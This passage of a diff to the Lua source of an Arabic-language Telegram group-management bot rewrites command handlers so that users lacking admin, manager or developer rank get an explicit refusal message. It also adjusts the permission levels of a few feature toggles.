+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:del(bot_id..'lock:tagrvrbot'..msg.chat_id_)   
 list ={"lock:Bot:kick","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","lock:Fars","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
 for i,lock in pairs(list) do 
@@ -11138,7 +12006,11 @@ send(msg.chat_id_, msg.id_,' ☉┇ تم طرد المحذوفين')
 end,nil)
 end
 end
-if text == 'الصلاحيات' and Mod(msg) then 
+if text == 'الصلاحيات' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 local list = database:smembers(bot_id..'Coomds'..msg.chat_id_)
 if #list == 0 then
 send(msg.chat_id_, msg.id_,' ☉┇ لا توجد صلاحيات مضافه')
@@ -11379,7 +12251,11 @@ return false
 end
 send(msg.chat_id_, msg.id_,' ☉┇ عدد رسائلك » { '..database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'}' ) 
 end 
-if text == 'تفعيل الاذاعه' and DevSoFi(msg) then  
+if text == 'تفعيل الاذاعه' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 if database:get(bot_id..'Bc:Bots') then
 database:del(bot_id..'Bc:Bots') 
 Text = '\n ☉┇ تم تفعيل الاذاعه' 
@@ -11388,7 +12264,11 @@ Text = '\n ☉┇ بالتاكيد تم تفعيل الاذاعه'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل الاذاعه' and DevSoFi(msg) then  
+if text == 'تعطيل الاذاعه' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Bc:Bots') then
 database:set(bot_id..'Bc:Bots',true) 
 Text = '\n ☉┇ تم تعطيل الاذاعه' 
@@ -11397,7 +12277,11 @@ Text = '\n ☉┇  بالتاكيد تم تعطيل الاذاعه'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل التواصل' and DevSoFi(msg) then  
+if text == 'تفعيل التواصل' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 if database:get(bot_id..'Tuasl:Bots') then
 database:del(bot_id..'Tuasl:Bots') 
 Text = '\n ☉┇ تم تفعيل التواصل' 
@@ -11406,7 +12290,11 @@ Text = '\n ☉┇ بالتاكيد تم تفعيل التواصل'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل التواصل' and DevSoFi(msg) then  
+if text == 'تعطيل التواصل' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Tuasl:Bots') then
 database:set(bot_id..'Tuasl:Bots',true) 
 Text = '\n ☉┇ تم تعطيل التواصل' 
@@ -11415,7 +12303,11 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل التواصل'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل البوت الخدمي' and DevSoFi(msg) then  
+if text == 'تفعيل البوت الخدمي' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -11433,7 +12325,11 @@ Text = '\n ☉┇ بالتاكيد تم تفعيل البوت الخدمي'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل البوت الخدمي' and DevSoFi(msg) then  
+if text == 'تعطيل البوت الخدمي' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -11476,7 +12372,11 @@ send(msg.chat_id_,msg.id_,'☉┇ تم مسح {'..num..'}')
 database:setex(bot_id..'S00F4:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
 end
 end
-if text == "مسح الميديا" and Manager2(msg) then
+if text == "مسح الميديا" then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end
 msgm = {[0]=msg.id_}
 local Message = msg.id_
 for i=1,100 do
@@ -11499,7 +12399,11 @@ end
 if (msg.content_.animation_) or (msg.content_.photo_) or (msg.content_.video_) or (msg.content_.document) or (msg.content_.sticker_) and msg.reply_to_message_id_ == 0 then
 database:sadd(bot_id.."S00F4:allM"..msg.chat_id_, msg.id_)
 end
-if text == ("امسح") and Manager2(msg) then  
+if text == ("امسح") then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end  
 local list = database:smembers(bot_id.."S00F4:allM"..msg.chat_id_)
 for k,v in pairs(list) do
 local Message = v
@@ -11514,7 +12418,11 @@ t = "☉┇ لا يوجد ميديا في المجموعه"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("عدد الميديا") and Manager2(msg) then  
+if text == ("عدد الميديا") then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end  
 local num = database:smembers(bot_id.."S00F4:allM"..msg.chat_id_)
 for k,v in pairs(num) do
 local numl = v
@@ -11527,7 +12435,11 @@ l = "☉┇ لا يوجد ميديا في المجموعه"
 end
 send(msg.chat_id_, msg.id_, l)
 end
-if text == "مسح التعديل" and Manager2(msg) then
+if text == "مسح التعديل" then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end
 Msgs = {[0]=msg.id_}
 local Message = msg.id_
 for i=1,100 do
@@ -11582,7 +12494,11 @@ local DRAGON_Msg = {
 send(msg.chat_id_, msg.id_,'['..DRAGON_Msg[math.random(#DRAGON_Msg)]..']') 
 return false
 end
-if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
+if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end 
 if database:get(bot_id..'Bc:Bots') and not DevSoFi(msg) then 
 send(msg.chat_id_, msg.id_,' ☉┇ الاذاعه معطله من قبل المطور الاساسي')
 return false
@@ -11600,7 +12516,11 @@ database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id
 send(msg.chat_id_, msg.id_," ☉┇ ارسل الان اذاعتك \n ☉┇ للخروج ارسل الغاء") 
 return false
 end 
-if text=="اذاعه" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
+if text=="اذاعه" and msg.reply_to_message_id_ == 0 then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end 
 if database:get(bot_id..'Bc:Bots') and not DevSoFi(msg) then 
 send(msg.chat_id_, msg.id_,' ☉┇ الاذاعه معطله من قبل المطور الاساسي')
 return false
@@ -11618,7 +12538,11 @@ database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user
 send(msg.chat_id_, msg.id_," ☉┇ ارسل الان اذاعتك \n ☉┇ للخروج ارسل الغاء ") 
 return false
 end  
-if text=="اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0  and Sudo(msg) then 
+if text=="اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0  then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end 
 if database:get(bot_id..'Bc:Bots') and not DevSoFi(msg) then 
 send(msg.chat_id_, msg.id_,' ☉┇ الاذاعه معطله من قبل المطور الاساسي')
 return false
@@ -11636,7 +12560,11 @@ database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_use
 send(msg.chat_id_, msg.id_," ☉┇ ارسل لي التوجيه الان") 
 return false
 end 
-if text=="اذاعه بالتوجيه خاص" and msg.reply_to_message_id_ == 0  and Sudo(msg) then 
+if text=="اذاعه بالتوجيه خاص" and msg.reply_to_message_id_ == 0  then
+if not Sudo(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثالث لاستخدام هذا الامر')
+return false
+end 
 if database:get(bot_id..'Bc:Bots') and not DevSoFi(msg) then 
 send(msg.chat_id_, msg.id_,' ☉┇  الاذاعه معطله من قبل المطور الاساسي')
 return false
@@ -11677,7 +12605,11 @@ sebd(msg.chat_id_,msg.id_,' ☉┇ تم تغيير اسم الجروب الى {[
 end
 end,nil) 
 end
-if text == "تاك للكل" and Mod(msg) then
+if text == "تاك للكل" then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -11785,7 +12717,11 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل الكل @(.*)$")}, start_function, nil)
 end
 
-if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Manager2(msg) then
+if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -11874,7 +12810,11 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
 end
 
-if text == ("مسح الردود العامه") and DevSoFi(msg) then 
+if text == ("مسح الردود العامه") then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 local list = database:smembers(bot_id..'List:Rd:Sudo')
 for k,v in pairs(list) do
 database:del(bot_id.."Add:Rd:Sudo:Gif"..v)   
@@ -11890,7 +12830,11 @@ end
 send(msg.chat_id_, msg.id_," ☉┇ تم مسح الردود العامه")
 end
 
-if text == ("الردود العامه") and DevSoFi(msg) then 
+if text == ("الردود العامه") then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 local list = database:smembers(bot_id..'List:Rd:Sudo')
 text = "\n ☉┇ قائمة الردود العامه \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -11986,7 +12930,11 @@ database:srem(bot_id..'List:Rd:Sudo', text)
 return false
 end
 end
-if text == 'اضف رد عام' and DevSoFi(msg) then 
+if text == 'اضف رد عام' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -12000,7 +12948,11 @@ send(msg.chat_id_, msg.id_,' ☉┇ ارسل الكلمه تريد اضافته�
 database:set(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
 return false 
 end
-if text == 'مسح رد عام' and DevSoFi(msg) then 
+if text == 'مسح رد عام' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -12098,7 +13050,11 @@ database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text)
 end  
 end
 end
-if text == ("مسح الردود") and Manager2(msg) then
+if text == ("مسح الردود") then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'List:Manager'..msg.chat_id_..'')
 for k,v in pairs(list) do
 database:del(bot_id.."Add:Rd:Manager:Gif"..v..msg.chat_id_)   
@@ -12114,7 +13070,11 @@ end
 send(msg.chat_id_, msg.id_," ☉┇ تم مسح الردود")
 end
 
-if text == ("الردود") and Manager2(msg) then
+if text == ("الردود") then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'List:Manager'..msg.chat_id_..'')
 text = " ☉┇ قائمه الردود \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -12222,7 +13182,11 @@ database:srem(bot_id..'List:Manager'..msg.chat_id_..'', text)
 return false
 end
 end
-if text == 'اضف رد' and Manager2(msg) then
+if text == 'اضف رد' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -12236,7 +13200,11 @@ send(msg.chat_id_, msg.id_,' ☉┇ ارسل الكلمه التي تريد اض
 database:set(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
 return false 
 end
-if text == 'مسح رد' and Manager2(msg) then
+if text == 'مسح رد' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -12342,7 +13310,11 @@ else
 send(msg.chat_id_, msg.id_,'☉┇لقبك هو : '..GeId.result.custom_title) 
 end
 end
-if text == "فحص البوت" and Manager2(msg) then
+if text == "فحص البوت" then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end
 local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
 local getInfo = JSON.decode(chek)
 if getInfo.ok == true then
@@ -12599,7 +13571,11 @@ send(msg.chat_id_, msg.id_,Text)
 end
 return false
 end
-if text == 'تفعيل المغادره' and DevSoFi(msg) then   
+if text == 'تفعيل المغادره' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end   
 if database:get(bot_id..'Left:Bot'..msg.chat_id_) then
 Text = ' ☉┇ تم تفعيل مغادرة البوت'
 database:del(bot_id..'Left:Bot'..msg.chat_id_)  
@@ -12608,7 +13584,11 @@ Text = ' ☉┇ بالتاكيد تم تفعيل مغادرة البوت'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل المغادره' and DevSoFi(msg) then  
+if text == 'تعطيل المغادره' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Left:Bot'..msg.chat_id_) then
 Text = ' ☉┇ تم تعطيل مغادرة البوت'
 database:set(bot_id..'Left:Bot'..msg.chat_id_,true)   
@@ -12618,7 +13598,11 @@ end
 send(msg.chat_id_, msg.id_, Text) 
 end
 
-if text == 'تفعيل الردود' and Manager2(msg) then   
+if text == 'تفعيل الردود' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end   
 if database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
 Text = ' ☉┇ تم تفعيل الردود'
 database:del(bot_id..'Reply:Manager'..msg.chat_id_)  
@@ -12627,7 +13611,11 @@ Text = ' ☉┇ تم تفعيل الردود'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل الردود' and Manager2(msg) then  
+if text == 'تعطيل الردود' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
 database:set(bot_id..'Reply:Manager'..msg.chat_id_,true)  
 Text = '\n ☉┇ تم تعطيل الردود' 
@@ -12636,7 +13624,11 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل الردود'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل الردود العامه' and Manager2(msg) then   
+if text == 'تفعيل الردود العامه' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end   
 if database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
 database:del(bot_id..'Reply:Sudo'..msg.chat_id_)  
 Text = '\n ☉┇ تم تفعيل الردود العامه' 
@@ -12645,7 +13637,11 @@ Text = '\n ☉┇ بالتاكيد تم تفعيل الردود العامه'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل الردود العامه' and Manager2(msg) then  
+if text == 'تعطيل الردود العامه' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
 database:set(bot_id..'Reply:Sudo'..msg.chat_id_,true)   
 Text = '\n ☉┇ تم تعطيل الردود العامه' 
@@ -12654,7 +13650,11 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل الردود العامه'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل الايدي' and Manager2(msg) then   
+if text == 'تفعيل الايدي' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end   
 if database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
 database:del(bot_id..'Bot:Id'..msg.chat_id_) 
 Text = '\n ☉┇ تم تفعيل الايدي' 
@@ -12663,7 +13663,11 @@ Text = '\n ☉┇  بالتاكيد تم تفعيل الايدي'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل الايدي' and Manager2(msg) then  
+if text == 'تعطيل الايدي' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
 database:set(bot_id..'Bot:Id'..msg.chat_id_,true) 
 Text = '\n ☉┇ تم تعطيل الايدي' 
@@ -12672,7 +13676,11 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل الايدي'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل الايدي بالصوره' and Manager2(msg) then   
+if text == 'تفعيل الايدي بالصوره' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end   
 if database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_)  then
 database:del(bot_id..'Bot:Id:Photo'..msg.chat_id_) 
 Text = '\n ☉┇ تم تفعيل الايدي بالصور' 
@@ -12681,7 +13689,11 @@ Text = '\n ☉┇ بالتاكيد تم تفعيل الايدي بالصوره'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل الايدي بالصوره' and Manager2(msg) then  
+if text == 'تعطيل الايدي بالصوره' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_)  then
 database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true) 
 Text = '\n ☉┇ تم تعطيل الايدي بالصوره' 
@@ -12852,7 +13864,11 @@ end
 end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 end
-if text==('عدد الجروب') and Mod(msg) then  
+if text==('عدد الجروب') then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end  
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_,msg.id_," ☉┇ البوت ليس ادمن \n") 
 return false  
@@ -12952,7 +13968,11 @@ send(msg.chat_id_, msg.id_,' ☉┇ تم تعطيل امر ضافني')
 end
 end
 
-if text == 'تفعيل ضافني' and Manager2(msg) then   
+if text == 'تفعيل ضافني' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end   
 if database:get(bot_id..'Added:Me'..msg.chat_id_) then
 Text = ' ☉┇ تم تفعيل امر منو ضافني'
 database:del(bot_id..'Added:Me'..msg.chat_id_)  
@@ -12961,7 +13981,11 @@ Text = ' ☉┇ بالتاكيد تم تفعيل امر منو ضافني'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل ضافني' and Manager2(msg) then  
+if text == 'تعطيل ضافني' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
 database:set(bot_id..'Added:Me'..msg.chat_id_,true)  
 Text = '\n ☉┇ تم تعطيل امر منو ضافني'
@@ -12970,7 +13994,11 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل امر منو ضافني'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل صيح' and Manager2(msg) then   
+if text == 'تفعيل صيح' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end   
 if database:get(bot_id..'Seh:User'..msg.chat_id_) then
 Text = ' ☉┇ تم تفعيل امر صيح'
 database:del(bot_id..'Seh:User'..msg.chat_id_)  
@@ -12986,7 +14014,11 @@ database:del(bot_id..'Mod:User'..msg.chat_id_)
 database:del(bot_id..'Special:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, '\n ☉┇ تم تنزيل الكل من الرتب الاتيه \n ☉┇ المميزين ، الادمنيه ، المدراء ، المنشئين \n')
 end
-if text == 'تعطيل صيح' and Manager2(msg) then  
+if text == 'تعطيل صيح' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
 database:set(bot_id..'Seh:User'..msg.chat_id_,true)  
 Text = '\n ☉┇ تم تعطيل امر صيح'
@@ -12995,7 +14027,11 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل امر صيح'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل اطردني' and Manager2(msg) then   
+if text == 'تفعيل اطردني' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end   
 if database:get(bot_id..'Cick:Me'..msg.chat_id_) then
 Text = ' ☉┇ تم تفعيل امر اطردني'
 database:del(bot_id..'Cick:Me'..msg.chat_id_)  
@@ -13004,7 +14040,11 @@ Text = ' ☉┇ بالتاكيد تم تفعيل امر اطردني'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل اطردني' and Manager2(msg) then  
+if text == 'تعطيل اطردني' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
 database:set(bot_id..'Cick:Me'..msg.chat_id_,true)  
 Text = '\n ☉┇ تم تعطيل امر اطردني'
@@ -13060,7 +14100,11 @@ send(msg.chat_id_, msg.id_,'المطور لا يضع صوره', 1, 'md')
 tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = SUDO, offset_ = 0, limit_ = 1 }, getpro, nil)
 end
 
-if text == 'تغير الايدي' and Manager2(msg) then 
+if text == 'تغير الايدي' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end 
 local List = {
 [[
 𖤍 |↶ #id    ꙰🇪🇬.
@@ -14396,7 +15440,11 @@ Text = ' ☉┇ عدد جهاتك *» { '..Num..' } *'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == " " and DevSoFi(msg) then -- مسح المشتركين
+if text == " " then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end -- مسح المشتركين
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -14432,7 +15480,11 @@ end,nil)
 end
 return false
 end
-if text == "مسح الجروبات" and DevSoFi(msg) then 
+if text == "مسح الجروبات" then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -14613,7 +15665,11 @@ send(msg.chat_id_,msg.id_,' ☉┇ تم خصم *» { '..NUMPY..' }* من نقا�
 end 
 return false 
 end
-if text == 'فحص البوت' and Manager2(msg) then
+if text == 'فحص البوت' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end
 local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. msg.chat_id_ ..'&user_id='.. bot_id..'')
 local Json_Info = JSON.decode(Chek_Info)
 if Json_Info.ok == true then
@@ -14680,7 +15736,7 @@ end
 ---------------------- الاوامر الجديده
 if text == 'الاوامر' then
 if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'')
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام الاوامر')
 return false
 end
 if AddChannel(msg.sender_user_id_) == false then
@@ -14760,7 +15816,7 @@ return false
 end
 if text == 'العاب متطوره' or text == 'الالعاب المتطوره' then
 if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'')
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام الالعاب')
 return false
 end
 if AddChannel(msg.sender_user_id_) == false then
@@ -14806,15 +15862,27 @@ send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم �
 database:del(bot_id..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_)
 return false   
 end
-if text == 'زخرفه' and Manager2(msg) or text == 'الزخرفه' and Manager2(msg)  then  
+if text == 'زخرفه' or text == 'الزخرفه' then  
 database:setex(bot_id.."Zrf:add"..msg.chat_id_..""..msg.sender_user_id_,10000,true)
 send(msg.chat_id_, msg.id_, '☉┇ ارسل لي الكلمه لزخرفتها ')
 end
-if text == "تعطيل الزخرفه" and Manager2(msg) then
+if text == "تعطيل الزخرفه" then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل الزخرفه')
 database:set(bot_id.." sofi:zhrf_Bots"..msg.chat_id_,"close")
 end
-if text == "تفعيل الزخرفه" and Manager2(msg) then
+if text == "تفعيل الزخرفه" then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 send(msg.chat_id_, msg.id_,'☉┇ تم تفعيل الزخرفه')
 database:set(bot_id.." sofi:zhrf_Bots"..msg.chat_id_,"open")
 end
@@ -14842,11 +15910,19 @@ t = t..i.."-  `"..v.."` \n"
 end
 send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•ٴ\n ⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️ ')
 end
-if text == "تعطيل الابراج" and Manager2(msg) then
+if text == "تعطيل الابراج" then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 send(msg.chat_id_, msg.id_, '☉┇ تم تعطيل الابراج')
 database:set(bot_id.."sofi:brj_Bots"..msg.chat_id_,"close")
 end
-if text == "تفعيل الابراج" and Manager2(msg) then
+if text == "تفعيل الابراج" then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 send(msg.chat_id_, msg.id_,'☉┇ تم تفعيل الابراج')
 database:set(bot_id.."sofi:brj_Bots"..msg.chat_id_,"open")
 end
